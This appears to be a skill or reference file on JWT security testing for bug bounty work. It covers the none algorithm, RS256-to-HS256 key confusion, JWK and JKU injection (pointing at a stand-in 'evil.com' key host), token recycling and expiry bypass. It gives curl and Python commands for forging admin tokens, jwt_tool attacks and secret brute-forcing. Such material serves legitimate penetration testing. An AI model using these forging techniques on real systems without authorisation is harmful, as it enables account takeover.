---
name: jwt-attack-techniques
description: JWT security testing: none algorithm, key confusion, alg header manipulation, jwk/jku injection, token recycling, audience/issuer confusion.
---

# JWT Attack Techniques

## Overview

JSON Web Tokens (JWT) are widely used for authentication. Common misconfigurations allow attackers to forge, manipulate, or steal tokens for account takeover.

---

## JWT Structure

```
header.payload.signature

Header: {"alg":"HS256","typ":"JWT"}
Payload: {"sub":"1234567890","name":"John","iat":1516239022}
Signature: HMACSHA256(base64(header) + "." + base64(payload), secret)
```

---

## Attack 1: None Algorithm

### How It Works
Change `alg` from `HS256` to `none` and remove the signature.

### Test
```bash
# Decode current JWT
echo "eyJhbGciOiJIUzI1NiJ9..." | base64 -d

# Modify header to use none algorithm
# {"alg":"none","typ":"JWT"}

# Create forged token (no signature)
echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_'
echo -n '{"sub":"admin","iat":1516239022}' | base64 -w0 | tr '+/' '-_'

# Send request with forged token
curl -H "Authorization: Bearer <forged_token>" https://target.com/api/admin
```

### Check
- Server accepts token with `alg: none`
- No signature verification
- Access granted with forged payload

---

## Attack 2: Key Confusion (RS256 → HS256)

### How It Works
If server uses RS256 (asymmetric) but also accepts HS256 (symmetric), use the PUBLIC key as the HMAC secret.

### Test
```bash
# Get the public key
curl -s https://target.com/.well-known/jwks.json | jq '.keys[0]'

# Convert public key to HMAC secret
openssl rsa -in public.pem -pubin -outform PEM > pubkey.pem
SECRET=$(cat pubkey.pem)

# Create token with HS256 using public key as secret
python3 -c "
import jwt
payload = {'sub': 'admin', 'iat': 1516239022}
token = jwt.encode(payload, open('pubkey.pem').read(), algorithm='HS256')
print(token)
"

# Send request
curl -H "Authorization: Bearer <forged_token>" https://target.com/api/admin
```

### Check
- Server accepts HS256 token signed with public key
- Access granted with admin payload

---

## Attack 3: Algorithm Confusion (RS256 → HS256)

### How It Works
Same as key confusion but more general - any algorithm switch.

### Test
```bash
# If server uses RS256, try:
# 1. Change header alg to HS256
# 2. Sign with public key
# 3. Send request

# Or try other algorithms:
# HS256, HS384, HS512, ES256, ES384, ES512, PS256, PS384, PS512
```

---

## Attack 4: JWK Injection

### How It Works
Inject a JSON Web Key (JWK) in the header that points to your own key.

### Test
```bash
# Create header with injected JWK
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "kid": "attacker-key",
    "use": "sig",
    "n": "<your_public_key_modulus>",
    "e": "<your_public_key_exponent>"
  }
}

# If server uses the injected key instead of its own
# → Token forged with your private key
```

---

## Attack 5: JKU Injection

### How It Works
Inject a JSON Web Key Set URL (JKU) pointing to your server.

### Test
```bash
# Create header with injected JKU
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://evil.com/keys.json"
}

# Host malicious keys.json on your server
# If server fetches your keys → token accepted
```

---

## Attack 6: Token Recycling

### How It Works
After password change, the old token may still be valid.

### Test
```bash
# 1. Login and get token
TOKEN=$(curl -X POST https://target.com/api/login \
  -d '{"email":"user@test.com","password":"oldpass"}' \
  -H "Content-Type: application/json" | jq -r '.token')

# 2. Change password
curl -X PUT https://target.com/api/password \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"old":"oldpass","new":"newpass"}'

# 3. Try old token (should be revoked)
curl -H "Authorization: Bearer $TOKEN" https://target.com/api/me

# If old token still works → vulnerability
```

---

## Attack 7: Audience/Issuer Confusion

### How It Works
If server doesn't validate `aud` (audience) or `iss` (issuer), use tokens from other services.

### Test
```bash
# 1. Get token from service A (low privilege)
TOKEN_A=$(curl -X POST https://service-a.com/login ...)

# 2. Use token on service B (high privilege)
curl -H "Authorization: Bearer $TOKEN_A" https://service-b.com/api/admin

# If service B accepts token from service A → vulnerability
```

---

## Attack 8: Expiration Bypass

### How It Works
If server doesn't validate `exp` (expiration), expired tokens still work.

### Test
```bash
# 1. Get valid token
TOKEN=$(curl -X POST https://target.com/api/login ...)

# 2. Wait for token to expire (or decode and check exp)

# 3. Use expired token
curl -H "Authorization: Bearer $TOKEN" https://target.com/api/me

# If expired token still works → vulnerability
```

---

## Attack 9: Nested JWT Attack

### How It Works
Some servers accept nested JWTs (JWT inside JWT), which can be exploited.

### Test
```bash
# Create nested JWT
INNER_JWT=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0).$(echo -n '{"sub":"admin"}' | base64 -w0).
OUTER_HEADER=$(echo -n '{"alg":"HS256","typ":"JWT","cty":"JWT"}' | base64 -w0)
NESTED_TOKEN="${OUTER_HEADER}.${INNER_JWT}"

# Some parsers process the inner JWT incorrectly
```

---

## Attack 10: JKU Race Condition

### How It Works
If server caches JKU, race condition can lead to key replacement.

### Test
```bash
# 1. Send token with JKU pointing to your server
# 2. Before server caches, change JKU to legitimate server
# 3. Race between cache update and token validation
```

---

## Testing Checklist

- [ ] Decode JWT and check algorithm
- [ ] Try changing alg to none
- [ ] Try key confusion (RS256 → HS256)
- [ ] Try algorithm confusion (RS256 → ES256, PS256, etc.)
- [ ] Check if JWK is validated
- [ ] Check if JKU is validated
- [ ] Check if token is revoked after password change
- [ ] Check if audience (aud) is validated
- [ ] Check if issuer (iss) is validated
- [ ] Check if expiration (exp) is validated
- [ ] Check if not-before (nbf) is validated
- [ ] Check for nested JWT acceptance
- [ ] Check for key ID (kid) validation

---

## Tools

```bash
# JWT decoding
echo "eyJhbGciOiJIUzI1NiJ9..." | base64 -d | jq .

# JWT manipulation
python3 -c "
import jwt
# Decode without verification
token = jwt.decode('eyJhbGciOiJIUzI1NiJ9...', options={'verify_signature': False})
print(token)
"

# jwt_tool
python3 jwt_tool.py <token> -X k  # Key confusion attack
python3 jwt_tool.py <token> -X n  # None algorithm attack
python3 jwt_tool.py <token> -X s  # Sign with public key

# jwt_crack
jwt-crack <token>  # Brute force weak secret
```

---

## Impact Assessment

| Finding | Severity | Bounty Range |
|---------|----------|--------------|
| None algorithm accepted | Critical | $5,000-$10,000 |
| Key confusion (RS256 → HS256) | Critical | $5,000-$10,000 |
| Algorithm confusion | Critical | $5,000-$10,000 |
| JWK injection | Critical | $5,000-$10,000 |
| JKU injection | Critical | $5,000-$10,000 |
| Token not revoked after password change | High | $2,000-$5,000 |
| Audience not validated | Medium | $500-$2,000 |
| Issuer not validated | Medium | $500-$2,000 |
| Expiration not validated | High | $2,000-$5,000 |
| Weak secret (brute-forceable) | High | $2,000-$5,000 |
